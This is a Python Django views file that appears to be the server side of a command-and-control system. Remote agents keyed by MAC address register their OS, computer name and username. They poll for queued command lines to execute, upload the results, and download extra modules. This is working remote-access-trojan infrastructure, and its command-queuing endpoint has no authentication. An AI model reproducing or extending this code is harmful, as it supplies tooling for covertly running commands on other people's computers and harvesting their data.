from rest_framework import status
from rest_framework.decorators import api_view
from rest_framework.response import Response

from django.http import FileResponse, Http404
from django.utils import timezone
from django.utils.html import escape
from django.views.decorators.http import require_GET

from .utils import get_client_ip
from .models import Agent, Session, Agent_session

import os


@api_view(['POST'])
def push_command(request, agent_identifier):
    """
    Adds the command to the command queue

    :param request:
    :return:
    """
    agent = Agent.objects.filter(identifier=agent_identifier)
    if not agent:
        raise Http404("Agent does not exist")

    agent = Agent.objects.get(identifier=agent_identifier)
    agent.push_cmd(request.data.get('cmdline'))
    return Response(data='', content_type='text/plain')


@api_view(['POST'])
def get_command(request, agent_identifier):
    """
    Extracts the agent info from the request, updates the database and sends corresponding commands if any

    :param request:
    :param agent_identifier: The MAC address of the agent
    :return: the command to execute or ''
    """
    agent = Agent.objects.filter(identifier=agent_identifier)
    if not agent:
        agent = Agent.create(identifier=agent_identifier)
    else:
        agent = Agent.objects.get(identifier=agent_identifier)

    info = request.data.dict()

    # initialise or update basic information about the agent
    agent.operating_system = info['operating_system']
    agent.computer_name = info['computer_name']
    agent.username = info['username']

    agent.last_online = timezone.now()
    agent.remote_ip = get_client_ip(request)
    agent.protocol = 'http'
    agent.save()

    # get commands to run
    cmdline = ''
    commands = agent.commands.order_by('timestamp')
    if commands:
        cmdline = commands[0].cmdline
        commands[0].delete()
    return Response(data=cmdline, content_type='text/plain')


@api_view(['POST'])
def output_command(request, agent_identifier):
    """
    Extracts the output from the request, updates the database

    :param request:
    :param agent_identifier: The MAC address of the agent
    :return:
    """
    agent = Agent.objects.filter(identifier=agent_identifier)
    if not agent:
        raise Http404("Agent does not exist")
    else:
        agent = Agent.objects.get(identifier=agent_identifier)

    info = request.data.dict()
    agent.output += escape(info["output"])
    agent.save()
    return Response(data='', content_type='text/plain')


@require_GET
def modules_download(request, module_name):
    """
    Allows agents to download modules from the server in zip format

    :param request:
    :param module_name: name of the module
    :return: the fileresponse object if the file is valid
    """
    modules_path = 'apps/api/modules'
    if module_name in os.listdir(modules_path):
        file_path = os.path.join(modules_path, module_name)
        try:
            module_file = open(file_path, 'rb')
        except PermissionError:
            raise Http404('Invalid File!')

        return FileResponse(module_file)

    raise Http404('Module does not exist!')
